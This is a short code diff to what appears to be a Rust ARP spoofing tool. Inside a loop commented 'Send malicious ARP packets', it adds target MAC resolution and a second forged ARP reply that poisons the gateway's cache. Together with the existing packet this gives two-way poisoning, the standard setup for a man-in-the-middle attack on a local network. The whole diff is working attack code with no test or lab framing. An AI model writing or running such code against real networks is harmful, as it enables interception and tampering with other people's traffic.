@@ -145,6 +145,8 @@ impl Command {
             self.target, host_mac, self.gateway, gateway_mac
         );
 
+        let target_mac = resolve_mac(&mut *tx, &mut *rx, host_ip, host_mac, self.target)?;
+
         // Send malicious ARP packets
         loop {
             send_arp_packet(
@@ -154,6 +156,14 @@ impl Command {
                 self.gateway,
                 gateway_mac,
                 ArpOperations::Reply,
+            )?;
+            send_arp_packet(
+              &mut *tx,
+              self.gateway,
+              host_mac,
+              self.target,
+              target_mac,
+              ArpOperations::Reply,
             )?;
             std::thread::sleep(std::time::Duration::from_secs(2));
         }
